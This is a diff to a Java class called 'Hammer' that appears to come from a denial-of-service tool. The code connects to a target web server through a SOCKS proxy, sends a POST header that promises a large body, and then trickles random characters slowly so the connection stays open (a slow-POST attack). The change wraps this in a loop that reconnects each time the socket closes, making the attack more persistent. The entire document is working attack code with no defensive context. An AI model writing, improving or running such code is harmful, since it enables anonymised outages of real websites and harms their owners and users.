@@ -43,34 +43,36 @@ public class Hammer implements Runnable {
 
 	@Override
 	public void run() {
-		try {
-			SocketAddress addr = new InetSocketAddress(phost, pport);
-			Proxy proxy = new Proxy(Proxy.Type.SOCKS, addr);
-			Socket socket = new Socket(proxy);
-			InetSocketAddress dest = new InetSocketAddress(address, port);
-			socket.connect(dest);
-			
-			OutputStream os = socket.getOutputStream();
-			
-			String useragent = getRandomUserAgent();
-			
-			os.write(("POST / HTTP/1.1\r\n" +
-                    "Host: " + address + "\r\n" +
-                    "User-Agent: " + useragent + "\r\n" +
-                    "Connection: keep-alive\r\n" +
-                    "Keep-Alive: 900\r\n" +
-                    "Content-Length: 10000\r\n" +
-                    "Content-Type: application/x-www-form-urlencoded\r\n\r\n").getBytes());
-			
-			while (Main.running) {
-				os.write((randomChar()).getBytes());
-				Thread.sleep(new Random().nextInt(3000));
+		while (Main.running) {
+			try {
+				SocketAddress addr = new InetSocketAddress(phost, pport);
+				Proxy proxy = new Proxy(Proxy.Type.SOCKS, addr);
+				Socket socket = new Socket(proxy);
+				InetSocketAddress dest = new InetSocketAddress(address, port);
+				socket.connect(dest);
+				
+				OutputStream os = socket.getOutputStream();
+				
+				String useragent = getRandomUserAgent();
+				
+				os.write(("POST / HTTP/1.1\r\n" +
+	                    "Host: " + address + "\r\n" +
+	                    "User-Agent: " + useragent + "\r\n" +
+	                    "Connection: keep-alive\r\n" +
+	                    "Keep-Alive: 900\r\n" +
+	                    "Content-Length: 10000\r\n" +
+	                    "Content-Type: application/x-www-form-urlencoded\r\n\r\n").getBytes());
+				
+				while (Main.running && !socket.isClosed()) {
+					os.write((randomChar()).getBytes());
+					Thread.sleep(new Random().nextInt(3000));
+				}
+				
+				socket.close();
+			} catch (Exception ex) {
+				ex.printStackTrace();
 			}
-			
-			socket.close();
-		} catch (Exception ex) {
-			ex.printStackTrace();
-		}
+		};
 	}
 	
 	public static String getRandomUserAgent() {
